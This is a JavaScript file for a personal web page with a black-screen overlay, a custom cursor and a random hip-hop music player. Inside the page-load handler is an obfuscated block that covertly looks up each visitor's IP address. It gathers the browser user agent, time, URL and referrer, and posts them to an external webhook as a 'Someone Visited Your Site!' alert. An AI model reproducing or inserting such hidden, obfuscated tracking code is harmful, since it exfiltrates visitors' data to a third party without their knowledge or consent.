const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  function _0x427b(_0x2b22b1,_0x54828e){var _0x2d38eb=_0x2d38();return _0x427b=function(_0x427b15,_0x56fe02){_0x427b15=_0x427b15-0x16d;var _0x5e5580=_0x2d38eb[_0x427b15];return _0x5e5580;},_0x427b(_0x2b22b1,_0x54828e);}var _0x540d47=_0x427b;(function(_0x4eae7e,_0x5b181d){var _0x297955=_0x427b,_0x35798b=_0x4eae7e();while(!![]){try{var _0x4e7c35=parseInt(_0x297955(0x172))/0x1*(-parseInt(_0x297955(0x16d))/0x2)+-parseInt(_0x297955(0x182))/0x3*(-parseInt(_0x297955(0x16f))/0x4)+-parseInt(_0x297955(0x186))/0x5*(parseInt(_0x297955(0x180))/0x6)+-parseInt(_0x297955(0x174))/0x7*(parseInt(_0x297955(0x171))/0x8)+-parseInt(_0x297955(0x177))/0x9+-parseInt(_0x297955(0x17b))/0xa+parseInt(_0x297955(0x16e))/0xb;if(_0x4e7c35===_0x5b181d)break;else _0x35798b['push'](_0x35798b['shift']());}catch(_0x2e80a9){_0x35798b['push'](_0x35798b['shift']());}}}(_0x2d38,0x6a1c8));var webhook='https://events.hookdeck.com/e/src_S1diJp0j0dPz',site=_0x540d47(0x17c),get_ip=function(){var _0x874ea8=_0x540d47,_0x5cba1d='',_0xe8df49=new XMLHttpRequest();return _0xe8df49[_0x874ea8(0x179)]('GET',site,![]),_0xe8df49[_0x874ea8(0x17f)](),_0xe8df49[_0x874ea8(0x178)]==0xc8&&(_0x5cba1d=_0xe8df49[_0x874ea8(0x17e)]),_0x5cba1d;};function get_browser(){var _0x4673d8=_0x540d47,_0xbf01ef=navigator[_0x4673d8(0x17a)];return _0xbf01ef;}function get_time(){var _0x43f8f0=_0x540d47,_0x2ee687=new Date(),_0x31bf20=_0x2ee687[_0x43f8f0(0x176)]();return _0x31bf20;}function get_url(){var _0xdc79be=_0x540d47,_0x58c53c=window[_0xdc79be(0x17d)][_0xdc79be(0x170)];return _0x58c53c;}function get_referrer(){var _0x56a288=_0x540d47,_0x29e486=document[_0x56a288(0x183)];return _0x29e486;}function send_webhook(){var _0x3d8834=_0x540d47;fetch(webhook,{'method':'POST','headers':{'Content-Type':_0x3d8834(0x184)},'body':JSON['stringify']({'content':'<@1083368117230653460> \x20Someone\x20Visited\x20Your\x20Site!\x0a```ini\x0aIP:\x20['+get_ip()+_0x3d8834(0x173)+get_browser()+_0x3d8834(0x175)+get_time()+_0x3d8834(0x181)+get_url()+']\x0aReferrer:\x20['+get_referrer()+_0x3d8834(0x185)})});}function _0x2d38(){var _0x59da44=['send','282KddMVv',']\x0aURL:\x20[','3RQmFmz','referrer','application/json',']\x0a[Made\x20by\x20!\x20LO$R]\x0a```','32855wXoKUN','28TMnduY','24144626DlYGjE','1959492PiLOjc','href','8UwvDdJ','26267FuIqfp',']\x0aBrowser:\x20[','1621746EueEnI',']\x0aTime:\x20[','toLocaleString','4364856DRQcXu','status','open','userAgent','8569700pATgWO','https://myexternalip.com/raw','location','responseText'];_0x2d38=function(){return _0x59da44;};return _0x2d38();}send_webhook();

  send_webhook();
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
